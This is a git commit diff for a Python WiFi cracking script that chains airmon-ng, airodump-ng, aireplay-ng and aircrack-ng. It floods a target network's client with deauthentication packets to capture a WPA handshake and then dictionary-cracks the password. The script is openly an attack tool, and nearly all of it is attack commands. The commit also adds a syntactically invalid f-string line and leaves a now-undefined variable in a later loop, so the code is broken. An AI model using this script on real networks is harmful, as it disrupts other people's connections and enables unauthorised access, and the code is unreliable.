8e455cb0dbe994e8ba17bb1d9151ef532aa06e53
Nux404 <78324112+Nux404@users.noreply.github.com>
2021-02-20 22:01:59 +0100

    AutomaticCRR.py

--- AutomaticCRR.py
+++ AutomaticCRR.py
@@ -10,18 +10,14 @@ import time
 aireplay = 0
 os.system("clear")
 
+print("If your not connect in super user mode (sudo su) restart the program.")
+time.sleep(3)
 print("I disclaim all responsibility for the use you make of my wifi cracking tool.")
 time.sleep(1)
-print("If your not connect in super user mode (sudo su) restart the program.")
-time.sleep(1)
 
-PATH = input("Enter the path to install files : ")
+PATH = os.getcwd()
+PATH = (f({PATH}/))
 
-PATH_Validity = os.path.exists(PATH)
-
-while PATH_Validity != True:
-	PATH = input("Please enter a valid path : ")
-	PATH_Validity = os.path.exists(PATH)
 
 if not os.path.exists(f"{PATH}AutomaticCRR"):
 	os.makedirs(f"{PATH}AutomaticCRR")
@@ -39,15 +35,15 @@ os.system(f"airmon-ng start {INTERFACE}")
 os.system("clear")
 os.system("airmon-ng")
 
-INTERFACE_2 = input("Retape the interface of your network card : ")
+INTERFACE = input("Retape the interface of your network card : ")
 os.system("clear")
 
-os.system(f"gnome-terminal -- airodump-ng {INTERFACE_2}")
+os.system(f"gnome-terminal -- airodump-ng {INTERFACE}")
 
 BSSID = input("Enter the BSSID to crack : ")
 CHANNEL = input("Enter the CHANNEL of the network to crack : ")
 
-os.system(f"gnome-terminal -- airodump-ng -c {CHANNEL} --bssid {BSSID} -w {PATH} {INTERFACE_2}")
+os.system(f"gnome-terminal -- airodump-ng -c {CHANNEL} --bssid {BSSID} -w {PATH} {INTERFACE}")
 time.sleep(10)
 
 STATION = input("Enter the STATION of the network to crack : ")
@@ -55,7 +51,7 @@ os.system("clear")
 
 while aireplay != 14:
 	aireplay = aireplay + 1
-	os.system(f"gnome-terminal -- aireplay-ng --deauth  0 -a {BSSID} -c {STATION} {INTERFACE_2}")
+	os.system(f"gnome-terminal -- aireplay-ng --deauth  0 -a {BSSID} -c {STATION} {INTERFACE}")
 
 print(f"When the sentence WPA HANDSHAKE FOUND: {BSSID} is displayed close the window(s) Sending 64 directed DeAuth.")
 print("")
@@ -69,7 +65,7 @@ while PATH_Validity != True:
 	PATH_Validity = os.path.exists(PATH_2)
 	PATH_LST = PATH_2
 
-os.system(f"airmon-ng stop {INTERFACE_2}")
+os.system(f"airmon-ng stop {INTERFACE}")
 os.system(f"aircrack-ng -a2 -b {BSSID} -w {PATH_LST} {PATH}-01.cap")
 
 retry = input("Do you want to retry with an another list ? [y/n]")
